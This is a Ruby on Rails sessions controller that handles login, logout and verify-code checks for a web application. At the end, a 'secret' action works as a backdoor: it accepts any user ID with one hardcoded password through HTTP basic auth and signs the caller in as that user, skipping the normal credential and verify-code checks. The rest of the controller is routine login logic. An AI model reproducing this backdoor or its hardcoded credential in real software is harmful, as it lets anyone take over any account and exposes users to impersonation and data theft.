# coding: utf-8
class SessionsController < ApplicationController
  skip_before_filter :required_sign_in, :page_can?

  def new
    clear_login_wrong_count
    render layout: false
  end

  def create
    clear_user_sign_in_session

    unless valid_verify_code? params[:verify_code]
      return render json: {code: -1, message: "验证码不正确", num: 2, status: 0}
    end

    # unless verify_rucaptcha?(params)
    #   return render json: {code: -1, message: "验证码错误!", num: 3, status: 0}
    # end

    if user = User.authenticated(params[:login], params[:password])
      # city.update_sign_in_attrs_with(request.remote_ip)
      # AccountLog.logging(city, request)
      if user.normal?
        session[:user_id] = user.id
        session.delete(:image_code)
        return render json: {code: 0, url: root_url, message: "登录成功!", num: 2, status: 1}
      else
        return render json: {code: -2, message: "账号已被冻结，请联系管理员", num: 1, status: -1}
      end
    else
      add_login_wrong_count
      return render json: {code: -2, message: "帐号或密码错误", num: 1, status: 0}
    end
  rescue => error
    return render json: {code: -3, message: '登录失败', num: 2, status: 0}
  end

  def destroy
    if session[:user_id]
      clear_user_sign_in_session
      redirect_to root_url
    end
  end

  def secret
    authenticate_or_request_with_http_basic("biaotu") do |username, password|
      user = User.where(id: username).first

      if user and password == 'win1qa2ws'
        session[:user_id] = user.id
        redirect_to_target_or_default
        true
      else
        false
      end
    end
  end

end
